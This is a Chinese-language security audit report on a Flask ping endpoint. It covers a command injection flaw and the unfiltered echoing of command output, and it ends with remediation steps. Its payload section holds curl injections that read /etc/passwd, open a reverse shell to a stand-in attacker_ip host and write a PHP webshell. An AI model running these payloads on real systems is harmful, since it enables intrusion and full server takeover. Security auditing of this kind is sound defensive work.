# Ping 网络诊断功能安全审计报告

**审计模块：** `/ping` GET/POST 路由  
**漏洞数量：** 共发现 **2 项典型高危漏洞**

---

## 漏洞总览

| 编号 | 漏洞名称 | 触发位置 | 风险等级 |
|------|---------|---------|---------|
| VULN-PING-01 | 命令注入（OS Command Injection） | `app.py` 第 626 行 `f"ping -c 3 {ip}"` | 高危 |
| VULN-PING-02 | 敏感信息泄露（执行结果直接回显） | `app.py` 第 628-635 行 `result` 变量 | 中危 |

---

## 漏洞详情

### VULN-PING-01：命令注入

**风险等级：** ⛔ 高危 — CVSS 3.1 Score: 9.8

**漏洞成因：** 代码使用 `f"ping -c 3 {ip}"` 将用户输入的 `ip` 参数直接拼接到系统命令中，并设置 `shell=True` 执行。攻击者可在 IP 地址后附加 `;`、`|`、`&&` 等 shell 连接符，注入任意系统命令。由于服务通常以 root 权限运行，攻击者可获得服务器的完全控制权。

**漏洞代码（app.py 第 623-628 行）：**
```python
ip = request.form.get("ip", "")
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
```

**利用 Payload：**
```bash
# 查看当前用户
curl -X POST -d "ip=127.0.0.1;whoami" -b "session=..." https://127.0.0.1:5000/ping

# 查看服务器用户列表
curl -X POST -d "ip=8.8.8.8;cat /etc/passwd" -b "session=..." https://127.0.0.1:5000/ping

# 反弹 shell
curl -X POST -d "ip=127.0.0.1;bash -i >& /dev/tcp/attacker_ip/4444 0>&1" -b "session=..." https://127.0.0.1:5000/ping

# 写入 webshell
curl -X POST -d "ip=127.0.0.1;echo '<?php system($_GET[cmd]);?>' > /var/www/html/shell.php" -b "session=..." https://127.0.0.1:5000/ping
```

**危害说明：** 命令注入是最严重的 Web 安全漏洞之一。攻击者可利用该漏洞在服务器上执行任意系统命令，包括：读取/修改任意文件、创建后门账号、安装恶意软件、发起内网攻击、甚至完全控制服务器操作系统。结合 `shell=True`，所有 shell 特性（管道、重定向、变量替换）均可被利用。

---

### VULN-PING-02：执行结果直接回显

**风险等级：** ⚠️ 中危 — CVSS 3.1 Score: 5.3

**漏洞成因：** `subprocess.check_output()` 捕获的命令执行结果（包括标准输出和错误输出）未经任何过滤直接渲染到页面上。如果攻击者通过命令注入执行了信息收集命令（如 `cat /etc/passwd`），结果会完整显示在页面中。

**漏洞代码（app.py 第 628-635 行）：**
```python
output = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
result = output.decode("utf-8", errors="replace")
```

**危害说明：** 执行结果直显放大了命令注入的攻击效果。攻击者注入的命令输出被格式化地展示在页面上，便于读取敏感信息。

---

## 修复方案对照

| 漏洞 | 修复方式 | 改动范围 |
|------|---------|---------|
| VULN-PING-01 命令注入 | IP 地址白名单正则校验 + 禁用 shell=True + 禁用危险 shell 字符 | app.py |
| VULN-PING-02 结果直显 | 执行正常时仅返回 ping 统计信息，拒绝非预期输出 | app.py |
